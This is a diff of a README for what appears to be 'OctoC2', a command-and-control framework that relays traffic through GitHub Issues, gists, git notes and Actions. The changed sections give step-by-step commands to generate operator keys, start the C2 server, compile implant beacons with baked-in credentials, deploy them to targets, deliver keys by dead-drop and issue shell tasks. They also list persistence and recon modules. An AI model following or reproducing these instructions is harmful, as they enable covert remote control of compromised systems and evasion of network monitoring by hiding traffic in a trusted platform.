@@ -59,7 +59,7 @@ For production engagements, swap PATs for GitHub App auth: installation tokens e
 | Implant     | `implant/`          | Bun/TS beacon, 11 channels, automatic fallback |
 | Server      | `server/`           | Task queue, SSE stream, gRPC endpoint |
 | Dashboard   | `dashboard/`        | Operator UI: real-time feed, bulk actions, decrypt panel |
-| CLI         | `octoctl/`          | Task queue, bulk shell, results decrypt, key rotation |
+| CLI         | `octoctl/`          | Setup wizard, beacon compiler, task queue, bulk shell, results decrypt |
 | OctoProxy   | `templates/proxy/`  | Relay through decoy repos via GitHub Actions |
 | Modules     | `modules/`          | Loadable post-ex scripts: recon, screenshot, persist |
 
@@ -94,38 +94,53 @@ git clone https://github.com/dstours/OctoC2.git
 cd OctoC2 && bun install
 ```
 
+### Option A: Interactive setup wizard (recommended)
+
+The wizard walks you through keygen, repo validation, auth mode, channel selection, `.env` generation, and beacon compilation in one command:
+
+```bash
+cd octoctl && bun run src/index.ts setup
+```
+
+### Option B: Manual setup
+
 1. Generate an operator keypair
 ```bash
 cd octoctl
-bun run src/index.ts keygen
-# Prints OCTOC2_OPERATOR_SECRET and OCTOC2_OPERATOR_PUBKEY
-# Keep the secret off disk; set MONITORING_PUBKEY in your repo for beacon registration
+bun run src/index.ts keygen --set-variable
+# Prints OCTOC2_OPERATOR_SECRET and pushes MONITORING_PUBKEY to repo
 ```
 
-2. Start the C2 server
+2. Export environment
 ```bash
-cd server
-OCTOC2_GITHUB_TOKEN=<PAT> \
-OCTOC2_REPO_OWNER=<owner> \
-OCTOC2_REPO_NAME=<repo> \
-OCTOC2_OPERATOR_SECRET=<base64url-secret> \
-bun run src/index.ts
+export OCTOC2_GITHUB_TOKEN=<PAT>
+export OCTOC2_REPO_OWNER=<owner>
+export OCTOC2_REPO_NAME=<repo>
+export OCTOC2_OPERATOR_SECRET=<base64url-secret>
 ```
 
-3. Open the operator dashboard
+3. Start the C2 server
 ```bash
-cd dashboard && bun run dev   # http://localhost:5173
+cd server && bun run src/index.ts
 ```
 
-4. Deploy a beacon
+4. Build and deploy a beacon
 ```bash
-cd implant
-OCTOC2_GITHUB_TOKEN=<PAT> \
-OCTOC2_REPO_OWNER=<owner> \
-OCTOC2_REPO_NAME=<repo> \
-bun run src/index.ts
+cd octoctl
+
+# Compile a standalone binary with baked credentials
+bun run src/index.ts build-beacon --outfile ./beacon --target bun-linux-x64
+
+# Actions-only beacon (for CI/CD environments)
+bun run src/index.ts build-beacon --outfile ./beacon --tentacle-priority actions
+
+# With GitHub App auth (recommended for production)
+bun run src/index.ts build-beacon --outfile ./beacon \
+  --app-id <id> --installation-id <id>
+# Then deliver the private key via dead-drop after first checkin:
+# bun run src/index.ts drop create --beacon <id> --app-key-file <pem>
 ```
-  Beacon registers via Issues on first check-in, then polls for encrypted tasks on each sleep cycle.
+Deploy the binary to target and execute. It registers via the configured channel on first check-in.
 
 5. Task and collect
 ```bash
@@ -135,15 +150,20 @@ bun run src/index.ts task <beaconId> --kind shell --cmd "id"
 bun run src/index.ts results <beaconId> --last 5
 ```
 
+6. Open the operator dashboard (optional)
+```bash
+cd dashboard && bun run dev   # http://localhost:5173
+```
+
 Channel selection examples:
 ```bash
 # git notes primary, gist fallback, issues last resort
-export OCTOC2_TENTACLE_PRIORITY=notes,gist,issues
+octoctl build-beacon --outfile ./beacon --tentacle-priority notes,gist,issues
 
-# WebSocket primary with Issues fallback
-export OCTOC2_TENTACLE_PRIORITY=http,issues
+# Actions-only (CI/CD)
+octoctl build-beacon --outfile ./beacon --tentacle-priority actions
 ```
-See the full docs for GitHub App auth, OctoProxy setup, bulk shell, OpenHulud key delivery, capability modules, and the E2E test suite.
+See the full docs for OctoProxy setup, bulk shell, OpenHulud key delivery, capability modules, and the E2E test suite.
 
 ## Testing
 ```bash
